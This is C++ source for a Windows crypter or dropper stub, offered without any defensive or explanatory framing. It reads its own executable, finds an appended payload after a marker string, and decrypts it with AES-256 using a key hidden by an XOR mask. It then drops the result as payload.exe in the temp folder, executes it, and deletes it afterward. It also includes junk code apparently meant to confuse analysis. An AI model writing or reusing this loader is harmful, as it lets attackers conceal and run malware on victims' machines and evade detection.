#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <shellapi.h>
#include <vector>
#include <cstdio>
#include <cstring>
#include <openssl/evp.h>

constexpr const char* MARKER = "ENCRYPTED_PAYLOAD_START";
constexpr size_t MARKER_LEN = 22;

uint8_t encryptedKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
uint8_t mask[] = { 0x63,0x63,0x60,0x55,0x55,0x6A,0x60,0x5B,0x6A,0x68,0x6A };
constexpr size_t keyLen = sizeof(encryptedKey);

void decryptKey(uint8_t* keyBuf) {
    for (size_t i = 0; i < keyLen; i++)
        keyBuf[i] = encryptedKey[i] ^ mask[i];
}

// AES-256 key and IV (32 bytes for AES-256, 16 bytes for IV)
uint8_t aesKey[32];
uint8_t aesIV[16];

void initializeAES() {
    // Generate a 32-byte AES-256 key from the XOR key
    uint8_t key[keyLen];
    decryptKey(key);
    
    // Use the XOR key as a seed to generate AES key and IV
    // This maintains compatibility with the existing key derivation
    for (int i = 0; i < 32; i++) {
        aesKey[i] = key[i % keyLen] ^ (i * 0x37);
    }
    for (int i = 0; i < 16; i++) {
        aesIV[i] = key[i % keyLen] ^ (i * 0x73);
    }
}

bool decryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aesKey, aesIV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(input.size());
    int outLen;
    
    if (EVP_DecryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen;
    if (EVP_DecryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(outLen + finalLen);
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

bool junkTrap(int x) {
    volatile int junk = x * 0x1337;
    return ((junk ^ (junk >> 3)) & 0x7) == 5;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    FILE* f = nullptr;
    if (fopen_s(&f, selfPath, "rb") != 0 || !f) return 1;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    std::vector<uint8_t> buf(size);
    fread(buf.data(), 1, size, f);
    fclose(f);

    size_t payloadOffset = 0;
    for (size_t i = 0; i + MARKER_LEN < buf.size(); i++) {
        if (memcmp(buf.data() + i, MARKER, MARKER_LEN) == 0) {
            payloadOffset = i + MARKER_LEN;
            break;
        }
    }
    if (payloadOffset == 0) return 1;

    std::vector<uint8_t> encryptedPayload(buf.begin() + payloadOffset, buf.end());

    initializeAES();

    std::vector<uint8_t> decryptedPayload;
    if (!decryptAES(encryptedPayload, decryptedPayload)) {
        return 1;
    }

    if (junkTrap((int)decryptedPayload.size())) {
        volatile int x = 42 * 1337;
        (void)x;
    }

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat_s(tempPath, "payload.exe");

    FILE* out = nullptr;
    if (fopen_s(&out, tempPath, "wb") != 0 || !out) return 1;

    fwrite(decryptedPayload.data(), 1, decryptedPayload.size(), out);
    fclose(out);

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = tempPath;
    sei.nShow = SW_SHOW;

    if (!ShellExecuteExA(&sei) || !sei.hProcess) return 1;

    WaitForSingleObject(sei.hProcess, INFINITE);
    CloseHandle(sei.hProcess);

    DeleteFileA(tempPath);

    return 0;
}
